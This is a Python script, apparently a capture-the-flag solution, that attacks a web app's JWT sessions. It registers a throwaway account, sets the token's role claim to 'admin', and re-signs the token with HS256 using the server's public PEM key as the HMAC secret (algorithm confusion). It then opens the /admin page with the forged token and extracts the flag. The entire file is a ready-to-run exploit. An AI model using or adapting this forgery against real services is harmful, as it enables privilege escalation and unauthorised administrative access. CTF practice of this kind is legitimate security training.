#!/usr/bin/env python3
"""Usage: python3 solve.py http://assigned-host:port"""
import base64
import hashlib
import hmac
import http.cookiejar
import json
import re
import secrets
import sys
import urllib.parse
import urllib.request

base = sys.argv[1].rstrip('/')
jar = http.cookiejar.CookieJar()
client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
username = 'liaison_' + secrets.token_hex(4)
password = secrets.token_urlsafe(18)
form = urllib.parse.urlencode({'username': username, 'password': password,
                               'full_name': 'Coalition Liaison', 'organisation': 'Contractor'}).encode()
client.open(urllib.request.Request(base + '/register', data=form), timeout=10).read()
token = next(cookie.value for cookie in jar if cookie.name == 'session')

def b64e(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64d(data):
    return base64.urlsafe_b64decode(data + '=' * (-len(data) % 4))

_, payload, _ = token.split('.')
claims = json.loads(b64d(payload))
claims['role'] = 'admin'
header = {'alg': 'HS256', 'typ': 'JWT'}
message = b64e(json.dumps(header, separators=(',', ':')).encode()) + '.' + \
          b64e(json.dumps(claims, separators=(',', ':')).encode())
pem = client.open(base + '/.well-known/kestrel-id.pem', timeout=10).read()
signature = b64e(hmac.new(pem, message.encode(), hashlib.sha256).digest())
forged = message + '.' + signature
request = urllib.request.Request(base + '/admin', headers={'Cookie': 'session=' + forged})
page = urllib.request.urlopen(request, timeout=10).read().decode()
print(re.search(r'CSCTF\{[^}]+\}', page).group())
